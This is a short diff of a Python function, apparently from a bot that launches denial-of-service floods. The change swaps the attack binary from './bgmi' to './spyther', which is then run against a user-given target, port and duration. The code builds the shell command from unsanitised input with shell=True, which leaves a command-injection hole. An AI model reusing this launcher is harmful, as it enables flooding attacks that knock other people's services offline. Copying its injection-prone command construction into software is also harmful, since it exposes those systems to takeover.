@@ -182,7 +182,7 @@ def execute_attack(user_id, target, port, time):
     # This function is responsible for running the attack and notifying the user when done
     try:
         # Run the attack command
-        full_command = f"./bgmi {target} {port} {time} 900 "  # Replace with actual attack command
+        full_command = f"./spyther {target} {port} {time} 900 "  # Replace with actual attack command
         subprocess.run(full_command, shell=True)
 
         # After attack is complete, notify the user
